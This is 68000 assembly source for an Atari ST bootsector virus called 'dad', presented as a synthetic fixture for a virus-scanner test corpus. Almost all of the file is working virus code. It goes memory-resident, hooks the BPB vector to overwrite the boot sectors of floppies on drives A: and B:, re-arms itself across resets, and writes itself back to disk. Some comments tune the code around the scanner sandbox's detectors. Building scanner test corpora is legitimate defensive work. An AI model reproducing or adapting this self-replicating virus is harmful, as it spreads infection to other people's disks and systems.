; ------------------------------------------------------------------
; synth1-dad.s — synthetic reset-resident ST bootsector virus "dad"
; Test fixture for the DiskCheck scanner corpus. Not derived from any
; real virus; era-authentic mechanics (Ghost-style reset survival).
;
;   * steals 1KB under _memtop and copies itself there
;   * hooks hdv_bpb -> infects floppies on later GEMDOS access
;   * reset-proofs via resvalid=$31415926 / resvector
;   * prints "dad.prg woz ere" on first boot
;   * bumps a generation byte and writes its own boot sector back
;     (BIOS Rwabs) — the propagation the scanner sandbox watches for
;
; Assembled with org 0: every label value IS its offset in the sector.
; All in-sector memory references are PC-relative; hook vector values
; are computed as resident_base + #offset.
; ------------------------------------------------------------------

RESVALID        equ     $0426
RESVECTOR       equ     $042a
MEMTOP          equ     $0436
HDV_BPB         equ     $0472
TRAP13VEC       equ     $00b4

; data-cell offsets (label - start)
OLDHDV          equ     oldhdv-start
GENCNT          equ     gencnt-start
MARKOFF         equ     marker-start

                org     0
start:
                bra.s   main
; $02-$1D: host BPB spliced in by build-viruses.mjs (placeholder only)
                ds.b    28

; --------------- boot entry (TOS jumps here, supervisor) ---------------
main:
                ; steal 1KB at the top of RAM, copy the sector there
                move.l  MEMTOP.w,d0
                sub.l   #$400,d0
                move.l  d0,MEMTOP.w
                movea.l d0,a2                 ; a2 = resident base
                lea     start(pc),a0
                ; longwords: a 512-iteration byte loop trips the scanner
                ; sandbox's spin detector before the copy finishes
                move.w  #$7f,d0
copy_loop:      move.l  (a0)+,(a2)+
                dbf     d0,copy_loop
                suba.l  #$200,a2              ; rewind to resident base

                ; hook hdv_bpb -> resident infect
                move.l  HDV_BPB.w,d0
                move.l  d0,OLDHDV(a2)
                move.l  a2,d0
                add.l   #infect,d0
                move.l  d0,HDV_BPB.w

                ; reset-proof: resvector -> resident resentry
                move.l  a2,d0
                add.l   #resentry,d0
                move.l  d0,RESVECTOR.w
                move.l  #$31415926,RESVALID.w

                ; payload: first-boot message
                pea     msg(pc)
                move.w  #9,-(sp)              ; Cconws
                trap    #1
                addq.l  #6,sp

                bsr.s   replicate
                rts

; ------------- warm-reset re-entry (via resvector, resident) -------------
resentry:
                lea     resentry(pc),a2       ; own runtime address
                move.l  a2,RESVECTOR.w        ; keep surviving resets
                move.l  #$31415926,RESVALID.w
                suba.l  #resentry,a2          ; a2 = resident base
                move.l  HDV_BPB.w,d0          ; re-hook (TOS reset vectors)
                move.l  d0,OLDHDV(a2)
                move.l  a2,d0
                add.l   #infect,d0
                move.l  d0,HDV_BPB.w
                rts

; ------------- boot-time self write-back (generation counter) ------------
replicate:
                lea     start(pc),a0
                addq.b  #1,GENCNT(a0)
                ; The generation bump deliberately does not recompute the
                ; $1234 boot checksum: the carrier sector is non-bootable
                ; after its first self-write on real TOS anyway, and the
                ; checksum is irrelevant to the sandbox contract.
                ; The scanner's 68000 sandbox intercepts trap #13 with the
                ; function number in d0.w and a flat arg layout, and leaves
                ; no ROM vector at $B4. Use its convention there so the
                ; propagation is observable; real TOS convention on hardware.
                move.l  TRAP13VEC.w,d0
                beq.s   sandbox_call
                clr.w   -(sp)                 ; dev = 0 (A:)
                clr.w   -(sp)                 ; recno = 0
                move.w  #1,-(sp)              ; count = 1
                pea     start(pc)             ; buf = our sector
                move.w  #1,-(sp)              ; rwflag = 1 (write)
                move.w  #4,-(sp)              ; Rwabs
                trap    #13
                adda.l  #14,sp
                rts
sandbox_call:   clr.w   -(sp)                 ; dev
                clr.w   -(sp)                 ; recno
                move.w  #1,-(sp)              ; count
                pea     start(pc)             ; buf
                move.w  #1,-(sp)              ; rwflag at 0(sp)
                move.w  #4,d0                 ; fn in d0 for the stub
                trap    #13
                adda.l  #12,sp
                rts

; ------------- hdv_bpb hook: infect floppies on access --------------------
; Runs from the resident copy, post-boot, on real TOS (the sandbox never
; calls hooks, so this path needs only be real-TOS correct).
; d0.w = drive GEMDOS is probing.
infect:
                movem.l d0-d3/a0-a3,-(sp)
                move.w  d0,d3                 ; drive
                cmpi.w  #1,d3
                bgt.w   infect_done           ; only floppies A:/B:
                suba.l  #544,sp
                movea.l sp,a1                 ; 512-byte buffer + 32 spare
                ; read target boot sector: Rwabs(0, buf, 1, 0, drive)
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                clr.w   -(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
                tst.l   d0
                bne.w   infect_rdone
                ; already carrying us? compare marker longword
                move.l  MARKOFF(a1),d0
                move.l  marker(pc),d1
                cmp.l   d0,d1
                beq.w   infect_rdone
                ; save the target's BPB ($02-$1D)
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
save_bpb:       move.b  (a0)+,(a3)+
                dbf     d0,save_bpb
                ; stamp our sector over the buffer
                lea     start(pc),a0
                move.w  #$1ff,d0
stamp:          move.b  (a0)+,(a1)+
                dbf     d0,stamp
                suba.l  #$200,a1
                ; restore the original BPB so the disk stays readable
                lea     2(a1),a0
                lea     512(a1),a3
                moveq   #27,d0
rest_bpb:       move.b  (a3)+,(a0)+
                dbf     d0,rest_bpb
                ; write it: Rwabs(1, buf, 1, 0, drive)
                move.w  d3,-(sp)
                clr.w   -(sp)
                move.w  #1,-(sp)
                pea     (a1)
                move.w  #1,-(sp)
                move.w  #4,-(sp)
                trap    #13
                adda.l  #14,sp
infect_rdone:   adda.l  #544,sp
infect_done:    movem.l (sp)+,d0-d3/a0-a3
                move.l  oldhdv(pc),a0
                jmp     (a0)                  ; chain to previous hdv_bpb

; ------------------------------ data --------------------------------------
msg:            dc.b    13,10,'dad.prg woz ere',13,10,0
                even
marker:         dc.b    'DAD!'
gencnt:         dc.b    0
                even
oldhdv:         dc.l    0
